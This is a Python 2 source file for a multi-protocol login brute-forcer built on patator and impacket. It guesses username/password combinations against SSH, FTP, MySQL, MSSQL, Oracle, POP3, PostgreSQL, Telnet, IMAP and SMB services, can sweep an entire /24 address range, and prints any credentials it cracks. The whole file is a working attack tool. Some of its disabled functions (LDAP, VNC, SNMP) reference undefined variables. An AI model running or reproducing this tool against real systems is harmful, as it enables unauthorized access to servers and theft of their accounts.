#coding:utf-8
#from common import MySQL,TASK_FINISHED,TASK_FAILED
from patator import SSH_login,FTP_login,MySQL_login,MSSQL_login,Oracle_login,POP_login,\
     Pgsql_login,Telnet_login,IMAP_login,LDAP_login,VNC_login,SNMP_login
from ftplib import FTP
import ftplib,sys,json,threading,sys,argparse

from multiprocessing import dummy
from time import ctime

def pt(user,passwd):
    print 'trying-%s:%s\n'%(user,passwd)
    
def sshbrute(param):
    domain = param[0]
    user = param[1]
    passwd = param[2]
    view = param[3]
    res = {}
    try:
        if view:
            pt(user,passwd)
        s = SSH_login()
        r = s.execute(domain,user=user,password=passwd)
        if r.code == '0':
            res[user] = passwd
            return res
        else:
            return res
    except Exception, e:
        return res

def ftpbrute(param):
    domain = param[0]
    user = param[1]
    passwd = param[2]
    view = param[3]
    res = {}
    try:
        if view:
            print 'trying:anonymous login.'
        ftp = FTP(domain)
        ftp.login()
        ftp.retrlines('LIST')
        res["anonymous"] = ""
        ftp.quit()
    except (ftplib.all_errors):
        pass

    try:
        if view:
            pt(user,passwd)
        f = FTP_login()
        r = f.execute(domain,user=user,password=passwd)
        if r.code == '230':
            res[user] = passwd
            return res
        else:
            return res
    except Exception, e:
        return res
def mysqlbrute(param):
    domain = param[0]
    user = param[1]
    passwd = param[2]
    view = param[3]
    res = {}
    try:
        if view:
            pt(user,passwd)
        m = MySQL_login()
        r = m.execute(domain,user=user,password=passwd)
        if r.code == '0':
            res[user] = passwd
            return res
        else:
            return res
    except Exception, e:
        return res

def mssqlbrute(param):
    domain = param[0]
    user = param[1]
    passwd = param[2]
    view = param[3]
    res = {}
    try:
        if view:
            pt(user,passwd)
        m = MSSQL_login()
        r = m.execute(domain,user=user,password=passwd)
        if r.code == '0':
            res[user] = passwd
            return res
        else:
            return res
    except Exception, e:
        return res

def oraclebrute(param):
    domain = param[0]
    user = param[1]
    passwd = param[2]
    view = param[3]
    res = {}
    try:
        if view:
            pt(user,passwd)
        m = Oracle_login()
        r = m.execute(domain,user=user,password=passwd,sid='orcl',service_name='orcl')
        if r.code == '0':
            res[user] = passwd
            return res
        else:
            return res
    except Exception, e:
        return res

def pop3brute(param):
    domain = param[0]
    user = param[1]
    passwd = param[2]
    view = param[3]
    res = {}
    try:
        if view:
            pt(user,passwd)
        m = POP_login()
        r = m.execute(domain,user=user,password=passwd)
        if r.code == '+OK':
            res[user] = passwd
            return res
        else:
            return res
    except Exception, e:
        return res

def pgsqlbrute(param):
    domain = param[0]
    user = param[1]
    passwd = param[2]
    view = param[3]
    res = {}
    try:
        if view:
            pt(user,passwd)
        m = Pgsql_login()
        r = m.execute(domain,user=user,password=passwd)
        if r.code == '0':
            res[user] = passwd
            return res
        else:
            return res
    except Exception, e:
        return res
from impacket.smbconnection import SMBConnection
def smbbrute(param):
    domain = param[0]
    user = param[1]
    passwd = param[2]
    view = param[3]
    res = {}
    try:
        if view:
            pt(user,passwd)        
        smb = SMBConnection('*SMBSERVER', domain)
        smb.login(user,passwd)
        smb.logoff()
        res[user] = passwd
        return res
    except Exception, e:
        return res

def telnetbrute(param):
    domain = param[0]
    user = param[1]
    passwd = param[2]
    view = param[3]
    res = {}
    try:
        if view:
            pt(user,passwd) 
        m = Telnet_login()
        r = m.execute2(domain,user=user,password=passwd)
        if r == 0:
            res[user] = passwd
            return res
        else:
            return res
    except Exception, e:
        return res

def imapbrute(param):
    domain = param[0]
    user = param[1]
    passwd = param[2]
    view = param[3]
    res = {}
    try:
        if view:
            pt(user,passwd) 
        m = IMAP_login()
        r = m.execute(domain,user=user,password=passwd)
        if r.code == 0:
            res[user] = passwd
            return res
        else:
            return res
    except Exception, e:
        return res

def ldapbrute(param):
    domain = param[0]
    user = param[1]
    word = param[2]
    res = {}
    try:
        if view:
            pt(user,passwd)        
        m = LDAP_login()
        r = m.execute(domain,binddn='',bindpw=word)
        if r.code == '0':
            res[user] = word
            return res
        else:
            return res
    except Exception, e:
        return res

def vncbrute(param):
    domain = param[0]
    port = param[1]
    word = param[2]
    res = {}
    try:
        if view:
            pt(user,passwd)        
        m = VNC_login()
        r = m.execute(domain,port=port,password=word)
        if r.code == 0:
            res[port] = word
            return res
        else:
            return res
    except Exception, e:
        return res

def snmpbrute(param):
    domain = param[0]
    user = param[1]
    word = param[2]
    res = {}
    try:
        if view:
            pt(user,passwd)        
        m = SNMP_login()
        r = m.execute(domain,user=user,auth_key=word)
        if r.code == '0':
            flag = 0
            res[user] = word
            return res
        else:
            return res
    except Exception, e:
        return res


'''
issuccess 0:failed,1:success
'''
P_Size = 3
def switch_brute(domain,users,passwds,typeid,view,flag):
    tool = tooltype[typeid]
    issuccess = 1
    args = []
    result = {}
    if flag == 0:
        for i in xrange(len(users)):
            for j in xrange(len(passwds)):
                args.append([domain,users[i],passwds[j],view])
    elif flag == 1:
        for i in xrange(len(users)):
            args.append([domain,users[i],passwds[i],view])
    p = dummy.Pool(processes=P_Size)
    res = p.map(tool,args)  
    for r in res:
        result.update(r)
    if not result:
        issuccess = 0
        detail = {'domain':domain,'flag':issuccess,'result':result}
        detail = json.dumps(detail) 
        print detail
        return detail
    else:
        detail = {'domain':domain,'flag':issuccess,'result':result}
        detail = json.dumps(detail) 
        print detail  
        return detail
tooltype = {
    1:ftpbrute,
    2:mysqlbrute,
    3:mssqlbrute,
    4:pop3brute,
    5:pgsqlbrute,
    6:telnetbrute,
    7:imapbrute,
    8:smbbrute,
    9:oraclebrute,
    10:sshbrute,
    #11:ldapbrute,
    #12:vncbrute,
    #13:snmpbrute
}
def dealip(ip):
    iplist = ip.split('.')
    ips = []
    for i in xrange(1,255):
        ips.append('.'.join([iplist[0],iplist[1],iplist[2],str(i)]))
    return ips
'''
-d target
-D target file
-A users and passwds file,e.g:user:passwd
-u username
-U username file
-p password
-P password file
-t tooltype
-v verbose
'''        
def main():
    parser = argparse.ArgumentParser(
        formatter_class=argparse.RawDescriptionHelpFormatter
    )
    parser.add_argument('-d')
    parser.add_argument('-D')
    parser.add_argument('-A')
    parser.add_argument('-u')
    parser.add_argument('-U')
    parser.add_argument('-p')
    parser.add_argument('-P')
    parser.add_argument('-s')
    parser.add_argument('-v', '--verbose', action='store_true', dest='verbose',
                    help='print processing')
    args = parser.parse_args()
    
    domains = []
    users = []
    passwds = []
    flag = 0
    if args.d is not None:
        if '/' in args.d:
            domains = dealip(args.d)
        else:
            domains.append(args.d)
    elif args.D is not None:
        fd = open(args.D)
        for domain in fd.readlines():
            domains.append(domain.strip())
    else:
        return 
    if args.A is not None:
        u_ps = open(args.A)
        for user in u_ps.readlines():
            if user.strip() == '':
                continue
            if ':' not in user:
                continue
            users.append(user.strip().split(':')[0])
            passwds.append(user.strip().split(':')[1])
    elif args.A is None:
        if args.u is not None:
            users.append(args.u)
        elif args.U is not None:
            fu = open(args.U)
            for user in fu.readlines():
                if user.strip() == '':
                    continue
                users.append(user.strip())
        else:
            return 
        if args.p is not None:
            passwds.append(args.p)
        elif args.P is not None:
            fp = open(args.P)
            for passwd in fp.readlines():
                if passwd.strip() == '':
                    continue
                passwds.append(passwd.strip())   
        else:
            return 
    if args.s is not None:
        typeid = int(args.s)
    else:
        return 
    if args.verbose:
        view = 1
    else:
        view = 0
    if args.A is not None:
        flag = 1
    for domain in domains:
        switch_brute(domain,users,passwds,typeid,view,flag)
if __name__ == '__main__':
    main()
    


